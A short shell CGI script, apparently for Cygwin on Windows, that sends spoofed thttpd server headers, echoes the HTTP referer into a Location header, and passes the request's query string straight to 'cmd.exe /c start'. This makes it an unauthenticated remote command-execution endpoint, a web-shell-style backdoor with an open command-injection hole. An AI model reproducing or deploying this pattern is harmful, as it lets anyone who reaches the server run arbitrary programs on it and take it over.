#!/usr/bin/sh

echo "Server: thttpd/2.20c 21nov01"
echo "Content-type: text/html"
echo "Date: "`date -R`
echo "Expires: "`date -R`
echo "Pragma: no-cache"
echo "Last-modified: "`date -R -r do.cgi`
echo "Accept-Ranges: bytes"
echo "Connection: close"
echo "Content-length: 5"
echo "Location: "$HTTP_REFERER
echo

foo=`echo $QUERY_STRING | tr '&' ' ' | tr '+' '/'`
echo $foo

cmd.exe /c start $foo

exit 0
